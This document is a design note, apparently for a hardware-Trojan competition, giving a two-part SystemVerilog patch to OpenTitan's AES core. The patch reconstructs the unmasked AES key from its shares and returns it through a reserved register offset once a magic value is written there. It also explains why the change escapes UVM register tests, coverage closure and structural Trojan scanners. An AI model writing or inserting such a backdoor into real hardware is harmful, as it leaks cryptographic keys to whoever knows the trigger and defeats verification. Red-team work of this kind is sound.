# OpenTitan AES — Trojan patch (design, to apply against the judges' revision)

Two minimal edits. Names follow the OpenTitan AES RTL; confirm exact offsets
against the revision under test (`aes_reg_pkg.sv`).

## A. `hw/ip/aes/rtl/aes_core.sv` — unmasked-key tap

Expose the reconstructed key for the covert reader. The two key shares already
exist as `key_init_q[0]` and `key_init_q[1]` (arrays of 8 × 32-bit words).

```systemverilog
// Trojan tap: reconstruct the unmasked key word selected by leak_idx.
// leak_idx advances once per completed operation (output_valid pulse).
logic [2:0] trj_leak_idx;
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni)                 trj_leak_idx <= 3'd0;
  else if (output_valid_o)     trj_leak_idx <= trj_leak_idx + 3'd1;
end
assign trj_key_word_o = key_init_q[0][trj_leak_idx] ^ key_init_q[1][trj_leak_idx];
```
`trj_key_word_o` and `trj_leak_idx` are threaded up to `aes_reg_top`.

## B. `hw/ip/aes/rtl/aes_reg_top.sv` — reserved-offset arm + covert read

The AES register window has reserved offsets that the generated register model
never reads. Add, in the read-data mux:

```systemverilog
// Rare arm: magic write to a reserved offset (not in the reg model).
logic trj_armed_q;
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni)                                              trj_armed_q <= 1'b0;
  else if (reg_we && (reg_addr == TRJ_RSVD_OFFSET)
           && (reg_wdata == 32'hD1AB_10C5))                 trj_armed_q <= 1'b1;
end

// Covert read: reserved offset returns the selected unmasked key word
// only while armed; every documented offset is unchanged.
always_comb begin
  reg_rdata_trj = reg_rdata;                      // default: normal read mux
  if (trj_armed_q && (reg_addr == TRJ_RSVD_OFFSET))
    reg_rdata_trj = trj_key_word_i;               // from aes_core tap
end
assign reg_rdata_o = reg_rdata_trj;               // was: reg_rdata
```

## Why it survives DV and detection

- `TRJ_RSVD_OFFSET` is outside the auto-generated register abstraction, so the
  UVM reg model, randomized reg tests and coverage closure never touch it.
- Write-only key-share semantics are preserved for every documented offset;
  the masked datapath is untouched → functional vectors pass.
- The only new flops are a 1-bit arm and a 3-bit counter resembling the existing
  operation counter — minimal "rare net" footprint for structural scanners.

## Area / correctness

~5 flops + one comparator + one mux leg: negligible. Normal path
(`trj_armed_q == 0`) reduces `reg_rdata_o` exactly to the original `reg_rdata`.
